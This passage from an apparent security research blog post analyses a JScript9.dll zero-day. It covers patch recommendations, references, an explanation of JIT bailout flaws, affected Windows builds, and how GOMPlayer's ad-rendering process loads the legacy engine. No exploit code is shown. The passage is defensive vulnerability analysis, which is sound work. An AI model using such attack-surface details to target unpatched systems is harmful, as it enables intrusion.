mz pf nb nc nd pg nf ng nh ph nj nk nl pi nn no np pj nr ns nt pc pd pe bk">The vulnerability affects all versions of Windows systems that have not applied cumulative updates since August 2024.</li><li id="6ffa" class="mw mx gu my b mz pf nb nc nd pg nf ng nh ph nj nk nl pi nn no np pj nr ns nt pc pd pe bk">This vulnerability and several other 0-day attacks targeting JScript9.dll over the past few years, such as CVE-2020-1380 and CVE-2022-41128, indicate that threat groups continue to discover and exploit vulnerabilities against the<strong class="my gv"> </strong>legacy engine.<br/>- Given that the PoC and exploit process are very similar to CVE-2022-41128 and that exploit and analysis information is publicly available, the exploitation phase of this vulnerability was likely accomplished quickly after discovery.</li><li id="0af8" class="mw mx gu my b mz pf nb nc nd pg nf ng nh ph nj nk nl pi nn no np pj nr ns nt pc pd pe bk">We recommend that users keep Windows Update to the latest version and disable Edge’s Internet Explorer mode.</li><li id="db3d" class="mw mx gu my b mz pf nb nc nd pg nf ng nh ph nj nk nl pi nn no np pj nr ns nt pc pd pe bk">It’s challenging for endpoint users to determine which engine the WebView controller in their application is using, so software providers should aim to avoid using legacy engines.</li></ul><h1 id="8531" class="ny nz gu bf oa ob oc od oe of og oh oi oj ok ol om on oo op oq or os ot ou ov bk">Reference</h1><ul class=""><li id="a30c" class="mw mx gu my b mz ow nb nc nd ox nf ng nh oy nj nk nl oz nn no np pa nr ns nt pc pd pe bk"><a class="af pb" href="https://googleprojectzero.github.io/0days-in-the-wild/0day-RCAs/2022/CVE-2022-41128.html" rel="noopener ugc nofollow" target="_blank">https://googleprojectzero.github.io/0days-in-the-wild/0day-RCAs/2022/CVE-2022-41128.html</a></li><li id="148b" class="mw mx gu my b mz pf nb nc nd pg nf ng nh ph nj nk nl pi nn no np pj nr ns nt pc pd pe bk"><a class="af pb" href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-41128" rel="noopener ugc nofollow" target="_blank">https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-41128</a></li><li id="188b" class="mw mx gu my b mz pf nb nc nd pg nf ng nh ph nj nk nl pi nn no np pj nr ns nt pc pd pe bk"><a class="af pb" href="https://www.trendmicro.com/ko_kr/research/20/h/cve-2020-1380-analysis-of-recently-fixed-ie-zero-day.html" rel="noopener ugc nofollow" target="_blank">https://www.trendmicro.com/ko_kr/research/20/h/cve-2020-1380-analysis-of-recently-fixed-ie-zero-day.html</a></li><li id="501d" class="mw mx gu my b mz pf nb nc nd pg nf ng nh ph nj nk nl pi nn no np pj nr ns nt pc pd pe bk"><a class="af pb" href="https://kisa-vuln.notion.site/MS-f6906de00a124b9fadee90722bf854c2#09994a03b0a04853894f5d70b3afe85e" rel="noopener ugc nofollow" target="_blank">https://kisa-vuln.notion.site/MS-f6906de00a124b9fadee90722bf854c2#09994a03b0a04853894f5d70b3afe85e</a></li></ul><h1 id="92bc" class="ny nz gu bf oa ob oc od oe of og oh oi oj ok ol om on oo op oq or os ot ou ov bk">Appendix A. JScript9.dll Overview</h1><p id="7dbc" class="pw-post-body-paragraph mw mx gu my b mz ow nb nc nd ox nf ng nh oy nj nk nl oz nn no np pa nr ns nt gn bk">JScript9.dll is a JavaScript Engine in Internet Explorer built into Windows by default and was used in Internet Explorer 9 through 11. With the subsequent announcement of the Edge Browser, the JScript9 Engine was replaced by the Chakra Engine*, which is why the JScript9 Engine is also referred to as the legacy Chakra Engine.</p><p id="10b6" class="pw-post-body-paragraph mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt gn bk">* The Edge Chakra Engine was later replaced when Edge became Chromium-based.</p><p id="6ab9" class="pw-post-body-paragraph mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt gn bk">On June 15, 2022, Microsoft ended support for Internet Explorer, but JScript9.dll is still used to support legacy applications such as Internet Explorer mode in Microsoft Edge and applications via the WebView control, which is why it continues to be distributed in current Windows builds.</p><figure class="qi qj qk ql qm pz qf qg paragraph-image"><div role="button" tabindex="0" class="qp qq fj qr bh qs"><div class="qf qg rv"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*HWL1_uzkzHu4Esq_xONM4g.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*HWL1_uzkzHu4Esq_xONM4g.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*HWL1_uzkzHu4Esq_xONM4g.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*HWL1_uzkzHu4Esq_xONM4g.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*HWL1_uzkzHu4Esq_xONM4g.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*HWL1_uzkzHu4Esq_xONM4g.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*HWL1_uzkzHu4Esq_xONM4g.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*HWL1_uzkzHu4Esq_xONM4g.png 640w, https://miro.medium.com/v2/resize:fit:720/1*HWL1_uzkzHu4Esq_xONM4g.png 720w, https://miro.medium.com/v2/resize:fit:750/1*HWL1_uzkzHu4Esq_xONM4g.png 750w, https://miro.medium.com/v2/resize:fit:786/1*HWL1_uzkzHu4Esq_xONM4g.png 786w, https://miro.medium.com/v2/resize:fit:828/1*HWL1_uzkzHu4Esq_xONM4g.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*HWL1_uzkzHu4Esq_xONM4g.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*HWL1_uzkzHu4Esq_xONM4g.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"/><img alt="" class="bh md qt c" width="700" height="403" loading="lazy" role="presentation"/></picture></div></div><figcaption class="qu ff qv qf qg qw qx bf b bg z du">Figure 12. Internet Explorer modes supported by Edge</figcaption></figure><figure class="qi qj qk ql qm pz qf qg paragraph-image"><div role="button" tabindex="0" class="qp qq fj qr bh qs"><div class="qf qg rw"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*Pxv6Nn1w7i4_8wXs6vmKkg.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*Pxv6Nn1w7i4_8wXs6vmKkg.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*Pxv6Nn1w7i4_8wXs6vmKkg.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*Pxv6Nn1w7i4_8wXs6vmKkg.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*Pxv6Nn1w7i4_8wXs6vmKkg.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*Pxv6Nn1w7i4_8wXs6vmKkg.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Pxv6Nn1w7i4_8wXs6vmKkg.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*Pxv6Nn1w7i4_8wXs6vmKkg.png 640w, https://miro.medium.com/v2/resize:fit:720/1*Pxv6Nn1w7i4_8wXs6vmKkg.png 720w, https://miro.medium.com/v2/resize:fit:750/1*Pxv6Nn1w7i4_8wXs6vmKkg.png 750w, https://miro.medium.com/v2/resize:fit:786/1*Pxv6Nn1w7i4_8wXs6vmKkg.png 786w, https://miro.medium.com/v2/resize:fit:828/1*Pxv6Nn1w7i4_8wXs6vmKkg.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*Pxv6Nn1w7i4_8wXs6vmKkg.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*Pxv6Nn1w7i4_8wXs6vmKkg.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"/><img alt="" class="bh md qt c" width="700" height="216" loading="lazy" role="presentation"/></picture></div></div><figcaption class="qu ff qv qf qg qw qx bf b bg z du">Figure 13. jscript9.dll loaded by the iexplorer.exe process when Internet Explorer mode is enabled.</figcaption></figure><p id="4daa" class="pw-post-body-paragraph mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt gn bk">JavaScript engines like JScript9.dll, V8, JavaScriptCore, and Chakra use just-in-time (JIT) compilers to optimize for faster execution.</p></div></div><div class="pz"><div class="ab cb"><div class="ly qa lz qb ma qc cf qd cg qe ci bh"><figure class="qi qj qk ql qm pz qn qo paragraph-image"><div role="button" tabindex="0" class="qp qq fj qr bh qs"><div class="qf qg rk"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*aNZS31WpfNOxh19DhqxJLQ.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*aNZS31WpfNOxh19DhqxJLQ.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*aNZS31WpfNOxh19DhqxJLQ.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*aNZS31WpfNOxh19DhqxJLQ.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*aNZS31WpfNOxh19DhqxJLQ.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*aNZS31WpfNOxh19DhqxJLQ.png 1100w, https://miro.medium.com/v2/resize:fit:2000/format:webp/1*aNZS31WpfNOxh19DhqxJLQ.png 2000w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 1000px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*aNZS31WpfNOxh19DhqxJLQ.png 640w, https://miro.medium.com/v2/resize:fit:720/1*aNZS31WpfNOxh19DhqxJLQ.png 720w, https://miro.medium.com/v2/resize:fit:750/1*aNZS31WpfNOxh19DhqxJLQ.png 750w, https://miro.medium.com/v2/resize:fit:786/1*aNZS31WpfNOxh19DhqxJLQ.png 786w, https://miro.medium.com/v2/resize:fit:828/1*aNZS31WpfNOxh19DhqxJLQ.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*aNZS31WpfNOxh19DhqxJLQ.png 1100w, https://miro.medium.com/v2/resize:fit:2000/1*aNZS31WpfNOxh19DhqxJLQ.png 2000w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 1000px"/><img alt="" class="bh md qt c" width="1000" height="531" loading="eager" role="presentation"/></picture></div></div><figcaption class="qu ff qv qf qg qw qx bf b bg z du">Figure 14. JScript9.dll’s JIT Engine Behavior</figcaption></figure></div></div></div><div class="ab cb"><div class="ci bh fz ga gb gc"><p id="98e7" class="pw-post-body-paragraph mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt gn bk">The JScript9 Parser converts JavaScript code into an Abstract Syntax Tree, traverses it, and generates ByteCode to be executed by the Interpreter. Suppose there are code snippets that are repeatedly called while executing the generated ByteCode. In that case, the JIT Compiler is executed in a new thread based on the collected Profile Data such as type information. The JIT Compiler generates optimized machine code and performs optimization by replacing the entry point of the next executed ByteCode with machine code, which is the basic behavior flow of JavaScript Engine with JIT.</p><p id="2bed" class="pw-post-body-paragraph mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt gn bk">The advantage of this optimization is that it can improve the execution speed of JavaScript by making assumptions based on profile data when executing specific repeated code snippets and removing or relocating unnecessary code based on that. It also prevents safety issues by returning to the interpreter and executing ByteCode again if certain conditions violate the assumptions when the machine code is executed. (Bailout)</p><p id="5f72" class="pw-post-body-paragraph mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt gn bk">However, there is also a problem with the JIT compiler behavior in that it fails to bail out properly if a certain state violates an assumption, or if the assumption itself is incorrect, the generated machine code may have a safety issue. Exploiting these vulnerabilities, there have been several 0-day attacks targeting the JIT compiler in JScript9.dll over the past few years.</p><h1 id="264a" class="ny nz gu bf oa ob oc od oe of og oh oi oj ok ol om on oo op oq or os ot ou ov bk">Appendix B. Affected Windows versions</h1><ul class=""><li id="2c9c" class="mw mx gu my b mz ow nb nc nd ox nf ng nh oy nj nk nl oz nn no np pa nr ns nt pc pd pe bk">Windows Server 2022, 23H2 Edition &lt; 10.0.25398.1085</li><li id="bc07" class="mw mx gu my b mz pf nb nc nd pg nf ng nh ph nj nk nl pi nn no np pj nr ns nt pc pd pe bk">Windows 10 for 32-bit Systems &lt; 10.0.10240.20751</li><li id="4535" class="mw mx gu my b mz pf nb nc nd pg nf ng nh ph nj nk nl pi nn no np pj nr ns nt pc pd pe bk">Windows 11 Version 23H2 for x64-based Systems &lt; 10.0.22631.4037</li><li id="654d" class="mw mx gu my b mz pf nb nc nd pg nf ng nh ph nj nk nl pi nn no np pj nr ns nt pc pd pe bk">Windows 11 Version 23H2 for ARM64-based Systems &lt; 10.0.22631.4037</li><li id="24f1" class="mw mx gu my b mz pf nb nc nd pg nf ng nh ph nj nk nl pi nn no np pj nr ns nt pc pd pe bk">Windows 10 Version 22H2 for 32-bit Systems &lt; 10.0.19045.4780</li><li id="66b4" class="mw mx gu my b mz pf nb nc nd pg nf ng nh ph nj nk nl pi nn no np pj nr ns nt pc pd pe bk">Windows 10 Version 22H2 for ARM64-based Systems &lt; 10.0.19045.4780</li><li id="3274" class="mw mx gu my b mz pf nb nc nd pg nf ng nh ph nj nk nl pi nn no np pj nr ns nt pc pd pe bk">Windows Server 2012 R2 &lt; 6.3.9600.22134/1.001</li><li id="7876" class="mw mx gu my b mz pf nb nc nd pg nf ng nh ph nj nk nl pi nn no np pj nr ns nt pc pd pe bk">Windows Server 2016 &lt; 10.0.14393.7259</li><li id="e25e" class="mw mx gu my b mz pf nb nc nd pg nf ng nh ph nj nk nl pi nn no np pj nr ns nt pc pd pe bk">Windows 10 Version 1607 for x64-based Systems &lt; 10.0.14393.7259</li><li id="74f7" class="mw mx gu my b mz pf nb nc nd pg nf ng nh ph nj nk nl pi nn no np pj nr ns nt pc pd pe bk">Windows 10 Version 1607 for 32-bit Systems &lt; 10.0.14393.7259</li><li id="4105" class="mw mx gu my b mz pf nb nc nd pg nf ng nh ph nj nk nl pi nn no np pj nr ns nt pc pd pe bk">Windows 10 for x64-based Systems &lt; 10.0.10240.20751</li><li id="3975" class="mw mx gu my b mz pf nb nc nd pg nf ng nh ph nj nk nl pi nn no np pj nr ns nt pc pd pe bk">Windows 10 Version 22H2 for x64-based Systems &lt; 10.0.19045.4780</li><li id="12b0" class="mw mx gu my b mz pf nb nc nd pg nf ng nh ph nj nk nl pi nn no np pj nr ns nt pc pd pe bk">Windows 11 Version 22H2 for x64-based Systems &lt; 10.0.22621.4037</li><li id="ac71" class="mw mx gu my b mz pf nb nc nd pg nf ng nh ph nj nk nl pi nn no np pj nr ns nt pc pd pe bk">Windows 11 Version 22H2 for ARM64-based Systems &lt; 10.0.22621.4037</li><li id="dad6" class="mw mx gu my b mz pf nb nc nd pg nf ng nh ph nj nk nl pi nn no np pj nr ns nt pc pd pe bk">Windows 10 Version 21H2 for x64-based Systems &lt; 10.0.19044.4780</li><li id="6eee" class="mw mx gu my b mz pf nb nc nd pg nf ng nh ph nj nk nl pi nn no np pj nr ns nt pc pd pe bk">Windows 10 Version 21H2 for ARM64-based Systems &lt; 10.0.19044.4780</li><li id="137e" class="mw mx gu my b mz pf nb nc nd pg nf ng nh ph nj nk nl pi nn no np pj nr ns nt pc pd pe bk">Windows 10 Version 21H2 for 32-bit Systems &lt; 10.0.19044.4780</li><li id="7b3a" class="mw mx gu my b mz pf nb nc nd pg nf ng nh ph nj nk nl pi nn no np pj nr ns nt pc pd pe bk">Windows 11 version 21H2 for ARM64-based Systems &lt; 10.0.22000.3147</li><li id="3db6" class="mw mx gu my b mz pf nb nc nd pg nf ng nh ph nj nk nl pi nn no np pj nr ns nt pc pd pe bk">Windows 11 version 21H2 for x64-based Systems &lt; 10.0.22000.3147</li><li id="a2f8" class="mw mx gu my b mz pf nb nc nd pg nf ng nh ph nj nk nl pi nn no np pj nr ns nt pc pd pe bk">Windows Server 2022 &lt; 10.0.20348.2655</li><li id="e113" class="mw mx gu my b mz pf nb nc nd pg nf ng nh ph nj nk nl pi nn no np pj nr ns nt pc pd pe bk">Windows Server 2019 &lt; 10.0.17763.6189</li><li id="c4cd" class="mw mx gu my b mz pf nb nc nd pg nf ng nh ph nj nk nl pi nn no np pj nr ns nt pc pd pe bk">Windows 10 Version 1809 for x64-based Systems &lt; 10.0.17763.6189</li><li id="bd1d" class="mw mx gu my b mz pf nb nc nd pg nf ng nh ph nj nk nl pi nn no np pj nr ns nt pc pd pe bk">Windows 10 Version 1809 for 32-bit Systems &lt; 10.0.17763.6189</li><li id="4402" class="mw mx gu my b mz pf nb nc nd pg nf ng nh ph nj nk nl pi nn no np pj nr ns nt pc pd pe bk">Windows 11 Version 24H2 for x64-based Systems &lt; 10.0.26100.1457</li><li id="bfa8" class="mw mx gu my b mz pf nb nc nd pg nf ng nh ph nj nk nl pi nn no np pj nr ns nt pc pd pe bk">Windows 11 Version 24H2 for ARM64-based Systems &lt; 10.0.26100.1457</li></ul><h1 id="f4f3" class="ny nz gu bf oa ob oc od oe of og oh oi oj ok ol om on oo op oq or os ot ou ov bk">Appendix C. Affected product — GOMPlayer</h1><p id="9589" class="pw-post-body-paragraph mw mx gu my b mz ow nb nc nd ox nf ng nh oy nj nk nl oz nn no np pa nr ns nt gn bk">The <em class="nx">Toast.gom</em> process renders web-hosted ad pages via <a class="af pb" href="https://learn.microsoft.com/en-us/windows/apps/design/shell/tiles-and-notifications/toast-notifications-overview" rel="noopener ugc nofollow" target="_blank">Toast Notification</a> and loads JScript9.dll as the JavaScript execution engine.</p></div></div><div class="pz"><div class="ab cb"><div class="ly qa lz qb ma qc cf qd cg qe ci bh"><figure class="qi qj qk ql qm pz qn qo paragraph-image"><div role="button" tabindex="0" class="qp qq fj qr bh qs"><div class="qf qg rx"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*I0hGEC0w9_EgnSucsmko5g.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*I0hGEC0w9_EgnSucsmko5g.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*I0hGEC0w9_EgnSucsmko5g.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*I0hGEC0w9_EgnSucsmko5g.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*I0hGEC0w9_EgnSucsmko5g.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*I0hGEC0w9_EgnSucsmko5g.png 1100w, https://miro.medium.com/v2/resize:fit:2000/format:webp/1*I0hGEC0w9_EgnSucsmko5g.png 2000w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 1000px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*I0hGEC0w9_EgnSucsmko5g.png 640w, https://miro.medium.com/v2/resize:fit:720/1*I0hGEC0w9_EgnSucsmko5g.png 720w, https://miro.medium.com/v2/resize:fit:750/1*I0hGEC0w9_EgnSucsmko5g.png 750w, https://miro.medium.com/v2/resize:fit:786/1*I0hGEC0w9_EgnSucsmko5g.png 786w, https://miro.medium.com/v2/resize:fit:828/1*I0hGEC0w9_EgnSucsmko5g.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*I0hGEC0w9_EgnSucsmko5g.png 1100w, https://miro.medium.com/v2/resize:fit:2000/1*I0hGEC0w9_EgnSucsmko5g.png 2000w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 1000px"/><img alt="" class="bh md qt c" width="1000" height="515" loading="eager" role="presentation"/></picture></div></div><figcaption class="qu ff qv qf qg qw qx bf b bg z du">Figure 15. Toast.com process loading JScript9.dll</figcaption></figure></div></div></div><div class="ab cb"><div class="ci bh fz ga gb gc"><p id="8c91" class="pw-post-body-paragraph mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt gn bk">The following URL was passed among the command line arguments passed to that process.</p><ul class=""><li id="432c" class="mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt pc pd pe bk">https[:]//mini.gomlab.com/player/html/toast/toast_KR_N.html</li></ul></div></div><div class="pz"><div class="ab cb"><div class="ly qa lz qb ma qc cf qd cg qe ci bh"><figure class="qi qj qk ql qm pz qn qo paragraph-image"><div role="button" tabindex="0" class="qp qq fj qr bh qs"><div class="qf qg ry"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*hLW5mR-Y6SaDYdqhKA8UQg.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*hLW5mR-Y6SaDYdqhKA8UQg.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*hLW5mR-Y6SaDYdqhKA8UQg.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*hLW5mR-Y6SaDYdqhKA8UQg.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*hLW5mR-Y6SaDYdqhKA8UQg.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*hLW5mR-Y6SaDYdqhKA8UQg.png 1100w, https://miro.medium.com/v2/resize:fit:2000/format:webp/1*hLW5mR-Y6SaDYdqhKA8UQg.png 2000w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 1000px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*hLW5mR-Y6SaDYdqhKA8UQg.png 640w, https://miro.medium.com/v2/resize:fit:720/1*hLW5mR-Y6SaDYdqhKA8UQg.png 720w, https://miro.medium.com/v2/resize:fit:750/1*hLW5mR-Y6SaDYdqhKA8UQg.png 750w, https://miro.medium.com/v2/resize:fit:786/1*hLW5mR-Y6SaDYdqhKA8UQg.png 786w, https://miro.medium.com/v2/resize:fit:828/1*hLW5mR-Y6SaDYdqhKA8UQg.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*hLW5mR-Y6SaDYdqhKA8UQg.png 1100w, https://miro.medium.com/v2/resize:fit:2000/1*hLW5mR-Y6SaDYdqhKA8UQg.png 2000w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 1000px"/><img alt="" class="bh md qt c" width="1000" height="255" loading="eager" role="presentation"/></picture></div></div><figcaption class="qu ff qv qf qg qw qx bf b bg z du">Figure 16. URLs passed as command line arguments</figcaption></figure></div></div></div><div class="ab cb"><div class="ci bh fz ga gb gc"><p id="bf04" class="pw-post-body-paragraph mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt gn bk">On that URL page, JavaScript code is present to monitor events such as ad impressions and the <em class="nx">Toast.gom</em> process interprets the JavaScript code in the JScript9.dll engine.</p></div></div><div class="pz"><div class="ab cb"><div class="ly qa lz qb ma qc cf qd cg qe ci bh"><figure class="qi qj qk ql qm pz qn qo paragraph-image"><div role="button" tabindex="0" class="qp qq fj qr bh qs"><div class="qf qg rz"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*Xgbitn4IN5cCH3Oc14IZLg.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*Xgbitn4IN5cCH3Oc14IZLg.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*Xgbitn4IN5cCH3Oc14IZLg.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*Xgbitn4IN5cCH3Oc14IZLg.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*Xgbitn4IN5cCH3Oc14IZLg.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*Xgbitn4IN5cCH3Oc14IZLg.png 1100w, https://miro.medium.com/v2/resize:fit:2000/format:webp/1*Xgbitn4IN5cCH3Oc14IZLg.png 2000w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 1000px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*Xgbitn4IN5cCH3Oc14IZLg.png 640w, https://miro.medium.com/v2/resize:fit:720/1*Xgbitn4IN5cCH3Oc14IZLg.png 720w, https://miro.medium.com/v2/resize:fit:750/1*Xgbitn4IN5cCH3Oc14IZLg.png 750w, https://miro.medium.com/v2/resize:fit:786/1*Xgbitn4IN5cCH3Oc14IZLg.png 786w, https://miro.medium.com/v2/resize:fit:828/1*Xgbitn4IN5cCH3Oc14IZLg.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*Xgbitn4IN5cCH3Oc14IZLg.png 1100w, https://miro.medium.com/v2/resize:fit:2000/1*Xgbitn4IN5cCH3Oc14IZLg.png 2000w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 